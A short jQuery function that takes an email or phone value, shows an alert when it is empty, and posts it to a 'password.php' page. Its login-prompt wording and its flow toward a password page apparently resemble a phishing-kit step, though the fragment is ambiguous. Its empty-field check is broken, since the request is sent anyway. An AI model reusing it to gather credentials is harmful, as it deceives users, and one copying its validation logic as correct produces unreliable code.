function kirim(){
    post();
	var email = $('#email').val();
	if(email == '')
	{
var yakin = alert('Email or phone cannot be empty!'); 
	if (yakin) { window.location = '#'; } else { window.location = ''; 
 } 
    }
	$.ajax({
		url	: 'page/password.php',
		data	: 'email='+email,
		type	: 'POST',
		dataType: 'html',
		success	: function(msg){
                     result();
	        $("#indexresult").html(msg);
	    }
	});
}